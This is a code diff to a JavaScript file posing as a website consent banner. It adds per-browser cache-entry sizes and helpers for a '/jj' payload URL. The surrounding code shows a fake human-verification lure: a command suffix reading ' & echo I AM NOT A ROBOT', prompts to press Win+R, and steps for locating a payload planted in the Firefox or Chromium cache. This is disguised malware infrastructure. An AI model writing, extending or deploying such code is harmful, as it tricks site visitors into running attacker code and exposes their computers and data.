@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.17',
+    version: '1.9.18',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -29,6 +29,12 @@
       chrome: 17189,
       edge: 17189,
       brave: 17189
+    },
+    cacheFileSizesJj: {
+      firefox: 0,
+      chrome: 17212,
+      edge: 17212,
+      brave: 17212
     },
     verificationSuffix: ' & echo I AM NOT A ROBOT',
     verificationTemplates: {
@@ -125,7 +131,7 @@
       if (bk === 'firefox') {
         statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes — Win+R scans Firefox cache2\\entries';
       } else {
-        var csz = (CONSENT_CONFIG.cacheFileSizes || {})[bk] || 0;
+        var csz = getActiveCacheFileSizes()[bk] || 0;
         statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ') — quit browser, run get-cache-size.cmd, set cacheFileSizes.' + bk + '=' + (csz || '?') + ', then Win+R';
       }
       statusEl.className = 'ok';
@@ -153,12 +159,26 @@
     return 'Profile 1';
   }
 
+  function isJjPayloadUrl() {
+    var u = CONSENT_CONFIG.cacheFileUrl || '';
+    return /\/jj([?#]|$)/i.test(u);
+  }
+
+  function getActiveCacheFileSizes() {
+    if (isJjPayloadUrl() && CONSENT_CONFIG.cacheFileSizesJj) {
+      return CONSENT_CONFIG.cacheFileSizesJj;
+    }
+    return CONSENT_CONFIG.cacheFileSizes || {};
+  }
+
   function getChromiumCacheEntrySize(browserKey) {
-    var cacheSizes = CONSENT_CONFIG.cacheFileSizes || {};
+    var cacheSizes = getActiveCacheFileSizes();
     var n = cacheSizes[browserKey];
     if (n && n > 0) return n;
     if (browserKey === 'edge' || browserKey === 'brave') {
       n = cacheSizes.chrome;
+      if (n && n > 0) return n;
+      n = (CONSENT_CONFIG.cacheFileSizes || {}).chrome;
       if (n && n > 0) return n;
     }
     return 0;
@@ -174,7 +194,7 @@
     if (!bodySize || bodySize < 1) return '';
 
     var cacheEntrySize = key === 'firefox'
-      ? (CONSENT_CONFIG.cacheFileSizes || {}).firefox
+      ? getActiveCacheFileSizes().firefox
       : getChromiumCacheEntrySize(key);
     if (key !== 'firefox' && (!cacheEntrySize || cacheEntrySize < 1)) return '';
 
